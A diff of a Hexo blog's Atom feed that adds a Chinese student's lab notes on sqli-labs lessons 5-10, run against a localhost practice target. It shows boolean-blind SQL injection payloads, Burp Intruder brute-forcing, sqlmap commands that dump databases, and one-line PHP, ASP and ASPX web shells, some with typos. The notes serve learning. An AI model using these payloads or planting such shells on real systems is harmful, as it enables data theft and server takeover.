@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2021-10-25T15:46:40.364Z</updated>
+  <updated>2021-10-27T11:25:41.432Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>lesson5~10总结</title>
+    <link href="http://example.com/2021/10/27/less5,6/"/>
+    <id>http://example.com/2021/10/27/less5,6/</id>
+    <published>2021-10-27T04:19:09.000Z</published>
+    <updated>2021-10-27T11:25:41.432Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="1-注入类型"><a href="#1-注入类型" class="headerlink" title="1.注入类型"></a>1.注入类型</h1><p><strong>sql注入形成的原因：用户被输入的非法数据被解释器执行</strong></p><h2 id="由注入类容区分为："><a href="#由注入类容区分为：" class="headerlink" title="由注入类容区分为："></a>由注入类容区分为：</h2><ol><li>数字类型注入</li><li>字符类型注入</li></ol><h2 id="由提交方式分为："><a href="#由提交方式分为：" class="headerlink" title="由提交方式分为："></a>由提交方式分为：</h2><ol><li>get注入</li><li>post注入</li><li>cookies注入</li><li>http注入</li></ol><h2 id="由获取信息不同分为："><a href="#由获取信息不同分为：" class="headerlink" title="由获取信息不同分为："></a>由获取信息不同分为：</h2><ol><li>基于bool的盲注，即可以根据返回页面判断条件真假的注入</li><li>基于时间的盲注，即不能根据页面返回类容判断任何信息，需要用条件语句查看时间延迟语句是否执行来判断。</li><li>基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接放回在页面中。</li></ol><hr><hr><p>很明显less1-4都是基于页面返回错误信息的报错注入，而从less5开始接触基于返回页面判断语句真假的bool注入</p><p><img src="https://i.loli.net/2021/10/27/oD3qw2Fr7TzHImE.png" alt="QQ截图20211027124159.png"></p><p>同样的用?id=1’ –+来判断注入</p><p>用?id=1’ order by 3–+来判断列数</p><p>但是无法用union select 来输出我们想要的内容</p><p>而是需要运用到 left（a,b）来<del>（推测）</del>暴力破解出它的表名，列名，库名甚至是字段</p><p>先演示，用?id=1’ and left((database()),1)=’a’ –+</p><p><img src="https://i.loli.net/2021/10/27/JbPU9kNjqZc6oxG.png" alt="QQ截图20211027125618.png"></p><p>以此类推直到查到库名的第一个字符是’s’</p><p><img src="https://i.loli.net/2021/10/27/xRpUOGof3X781tB.png" alt="QQ截图20211027125834.png"></p><p>然后再爆破库名第二个字符</p><p>直到我们把库名，表名，列名还有字段都爆破出来。</p><p>想到这头皮发麻，那么有没有更简单的方法呢？有！</p><hr><h1 id="二分法"><a href="#二分法" class="headerlink" title="二分法"></a>二分法</h1><p>利用ascii()来将返回的字母转换成数字(整型)，</p><p>?id=1’ and ascii(substr((database()),1,1))&gt;110–+来减少执行语句的优化。</p><p>一般般。</p><hr><h1 id="burpsuite爆破"><a href="#burpsuite爆破" class="headerlink" title="burpsuite爆破"></a>burpsuite爆破</h1><p>用burpsuite挂代理（proxy）</p><p><img src="https://i.loli.net/2021/10/27/mKYzUd1gnE8SBFu.png" alt="QQ截图20211027130429.png"></p><p>然后把请求发给instruder</p><p><img src="https://i.loli.net/2021/10/27/SRiKkcAfvL37Zad.png" alt="QQ截图20211027130503.png"></p><p>对left((database()),1)=’’ 引号里面 add$,单参数</p><p>调整sniper的攻击模式，调整字典为“abcdefghijklmnopqrstuvwxyz”</p><p>然后start attack，开始爆破</p><p><img src="https://i.loli.net/2021/10/27/h6IV3isf5jwgprl.png" alt="QQ截图20211027132122.png"></p><p>然后字长不一样的就是正确的</p><p>这样省了我们改字母的时间但是无法明确的给出库名还是得一个一试然后拼凑在一起。</p><p>那么还有更简便的方法吗？有</p><hr><h1 id="sqlmap应用"><a href="#sqlmap应用" class="headerlink" title="sqlmap应用"></a>sqlmap应用</h1><p>直接cmd-&gt;py sqlmap.py  -u ‘<a href="http://localhost/Less-5/?id=&#39;">http://localhost/Less-5/?id=&#39;</a> –dbs  爆库</p><p>py  sqlmap.py -u ‘<a href="http://localhost/Less-5/?id=1&#39;">http://localhost/Less-5/?id=1&#39;</a> -D”库名” –tables 爆表</p><p>py sqlmap.py -u ‘<a href="http://localhost/Less-5/?id=1&#39;">http://localhost/Less-5/?id=1&#39;</a> -D”库名” -T”表名” –columns 爆字段</p><p>py sqlmap.py -u ‘<a href="http://localhost/Less-5/?id=1&#39;">http://localhost/Less-5/?id=1&#39;</a> -D”库名” -T”表名” -C”字段名” –dump  打包丢出</p><p>简单易懂，一步到位</p><p>详见“鲲鹏杯战后总结”</p><hr><h1 id="补充基本知识"><a href="#补充基本知识" class="headerlink" title="补充基本知识"></a>补充基本知识</h1><ol><li>一句话木马：</li></ol><p>php的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_post</span>[<span class="string">&quot;crow&quot;</span>]);<span class="meta">?&gt;</span>  <span class="comment">//其中crow为密码</span></span><br></pre></td></tr></table></figure><p>asp的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%eval requst(crow)%&gt;</span><br></pre></td></tr></table></figure><p>aspx的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=&quot;啥语言&quot;%&gt;&lt;%eval(Requst.Item[&quot;crow&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure><p>配合 菜刀 蚁剑 食用 味道更佳</p><ol start="2"><li>load_file() 读取当地文件</li><li>into outfile 写文件  select ‘crow666’ into outfile  ‘C:\phpstudy\text.txt’</li></ol>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;1-注入类型&quot;&gt;&lt;a href=&quot;#1-注入类型&quot; class=&quot;headerlink&quot; title=&quot;1.注入类型&quot;&gt;&lt;/a&gt;1.注入类型&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;sql注入形成的原因：用户被输入的非法数据被解释器执行&lt;/strong&gt;&lt;/p&gt;
+&lt;h2 i</summary>
+      
+    
+    
+    
+    
+    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
   
   <entry>
     <title>“鲲鹏杯战后总结”</title>
